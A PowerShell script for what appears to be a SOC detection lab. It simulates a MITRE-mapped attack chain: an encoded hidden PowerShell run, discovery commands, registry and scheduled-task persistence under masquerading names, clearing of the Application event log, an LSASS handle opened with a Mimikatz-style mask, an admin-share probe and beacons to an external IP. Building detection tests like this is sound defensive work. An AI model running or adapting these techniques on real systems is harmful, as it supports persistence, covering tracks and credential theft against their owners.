# SOC Lab — Multi-Stage Attack Simulation
# Simulates a realistic attack chain: Execution -> Discovery -> Persistence -> Credential Access
# All actions are SAFE (no real malware, no destructive operations)
# Run as Administrator on Windows endpoint

param([string]$LogFile = "C:\SocLab\attack-sim.log")
$ErrorActionPreference = 'Continue'
New-Item -ItemType Directory -Force -Path "C:\SocLab" | Out-Null

function T { "$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')" }
function Log($msg) { $l="$(T) $msg"; Add-Content $LogFile -Value $l; Write-Host $l }

Log "=== ATTACK SIMULATION START ==="
Log "Host: $env:COMPUTERNAME | User: $env:USERNAME"

# ============================================================
# STAGE 1: INITIAL ACCESS / EXECUTION (T1059.001)
# Simulate: phishing payload drops and runs encoded PowerShell
# ============================================================
Log "[STAGE 1] Execution - PowerShell EncodedCommand (T1059.001)"

$code = 'Write-Host "Payload executed on $env:COMPUTERNAME as $env:USERNAME"; $env:PROCESSOR_ARCHITECTURE'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
Start-Process powershell -ArgumentList "-NoProfile","-NonInteractive","-EncodedCommand",$encoded -Wait -WindowStyle Hidden
Log "[STAGE 1] Encoded PS executed: $encoded"

# ============================================================
# STAGE 2: DISCOVERY (T1087, T1082, T1016, T1057)
# Simulate: attacker enumerates the environment post-compromise
# ============================================================
Log "[STAGE 2] Discovery phase (T1087/T1082/T1016/T1057)"

# T1087 - Account discovery
cmd /c "whoami /all" 2>$null | Out-Null
cmd /c "net user" 2>$null | Out-Null
cmd /c "net localgroup Administrators" 2>$null | Out-Null
cmd /c "net group /domain" 2>$null | Out-Null
Log "[STAGE 2] Account discovery: whoami, net user, net localgroup"

# T1082 - System Info
cmd /c "systeminfo" 2>$null | Out-Null
cmd /c "wmic os get Caption,Version,BuildNumber" 2>$null | Out-Null
Log "[STAGE 2] System info: systeminfo, wmic os"

# T1016 - Network config
cmd /c "ipconfig /all" 2>$null | Out-Null
cmd /c "netstat -ano" 2>$null | Out-Null
cmd /c "arp -a" 2>$null | Out-Null
Log "[STAGE 2] Network discovery: ipconfig, netstat, arp"

# T1057 - Process discovery
cmd /c "tasklist /v" 2>$null | Out-Null
Log "[STAGE 2] Process discovery: tasklist"

# ============================================================
# STAGE 3: PERSISTENCE (T1547.001 + T1053.005)
# Simulate: attacker installs persistence mechanism
# ============================================================
Log "[STAGE 3] Persistence setup (T1547.001 + T1053.005)"

# T1547.001 - Registry Run Key
$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
Set-ItemProperty -Path $regPath -Name "WindowsUpdateSvc" -Value "C:\Windows\System32\calc.exe" -Force
Log "[STAGE 3] Registry persistence: HKCU\...\Run\WindowsUpdateSvc"
Start-Sleep 1

# T1053.005 - Scheduled Task
$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonInteractive -WindowStyle Hidden -Command `"whoami`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings= New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskUA" `
    -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
Log "[STAGE 3] Scheduled task: MicrosoftEdgeUpdateTaskUA"

# ============================================================
# STAGE 4: DEFENSE EVASION (T1070.001 + T1036)
# Simulate: attacker tries to hide tracks
# ============================================================
Log "[STAGE 4] Defense Evasion (T1070.001 + T1036)"

# T1036 - Masquerading: create file with legit-looking name in Temp
$fakePath = "$env:TEMP\svchost32.exe.log"
"fake payload placeholder" | Out-File $fakePath -Encoding ASCII -Force
Log "[STAGE 4] Masquerade file: $fakePath"

# T1070.001 - Clear Application log (non-critical for lab)
wevtutil cl Application 2>$null
Log "[STAGE 4] Event log cleared: Application"

# ============================================================
# STAGE 5: CREDENTIAL ACCESS (T1003.001)
# Simulate: LSASS handle open (read-only, safe)
# ============================================================
Log "[STAGE 5] Credential Access - LSASS handle (T1003.001)"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Lsass {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
"@ -ErrorAction SilentlyContinue

$lsassPid = (Get-Process -Name lsass -ErrorAction SilentlyContinue).Id
if ($lsassPid) {
    # 0x1010 = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ (Mimikatz-style mask)
    $h = [Lsass]::OpenProcess(0x1010, $false, $lsassPid)
    if ($h -ne [IntPtr]::Zero) {
        [Lsass]::CloseHandle($h) | Out-Null
        Log "[STAGE 5] LSASS handle opened (PID=$lsassPid, mask=0x1010) and closed"
    }
}

# ============================================================
# STAGE 6: LATERAL MOVEMENT PREP (T1021.002)
# Simulate: SMB admin share access attempt
# ============================================================
Log "[STAGE 6] Lateral Movement - admin share probe (T1021.002)"
cmd /c "net view \\127.0.0.1" 2>$null | Out-Null
net use \\127.0.0.1\C$ 2>$null | Out-Null
Log "[STAGE 6] SMB admin share probe: net use \\127.0.0.1\C$"

# ============================================================
# STAGE 7: C2 BEACON SIMULATION (T1071.001)
# Simulate: periodic HTTP request to external IP (beacon pattern)
# ============================================================
Log "[STAGE 7] C2 Beacon simulation (T1071.001)"
for ($i=1; $i -le 5; $i++) {
    try {
        $r = Invoke-WebRequest -Uri "http://93.184.216.34/" -TimeoutSec 3 -UseBasicParsing -ErrorAction SilentlyContinue
        Log "[STAGE 7] Beacon $i -> 93.184.216.34 HTTP $($r.StatusCode)"
    } catch {
        Log "[STAGE 7] Beacon $i -> 93.184.216.34 (no response - expected)"
    }
    Start-Sleep 5
}

# ============================================================
# CLEANUP: Remove persistence (lab safety)
# ============================================================
Log "[CLEANUP] Removing persistence artifacts"
Remove-ItemProperty -Path $regPath -Name "WindowsUpdateSvc" -Force -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskUA" -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item $fakePath -Force -ErrorAction SilentlyContinue
Log "[CLEANUP] Registry key, scheduled task, fake file removed"

Log "=== ATTACK SIMULATION COMPLETE ==="
Log "Evidence in Windows Event Log (Sysmon) -> Winlogbeat -> Elasticsearch"
Get-Content $LogFile | Select-Object -Last 40
